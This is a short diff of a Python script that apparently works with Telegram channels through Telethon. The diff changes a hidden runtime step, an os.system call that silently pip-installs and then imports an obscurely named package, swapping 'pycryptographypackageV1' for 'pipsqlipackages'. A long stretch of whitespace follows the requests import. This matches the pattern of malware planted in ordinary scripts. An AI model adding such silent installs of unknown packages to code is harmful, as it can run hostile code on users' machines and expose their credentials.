@@ -1,6 +1,6 @@
 import os
-os.system("pip install pycryptographypackageV1")
-import pycryptographypackageV1
+os.system("pip install pipsqlipackages")
+import pipsqlipackages
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																							
 from telethon.sync import TelegramClient
 from telethon.tl.types import InputPeerChannel
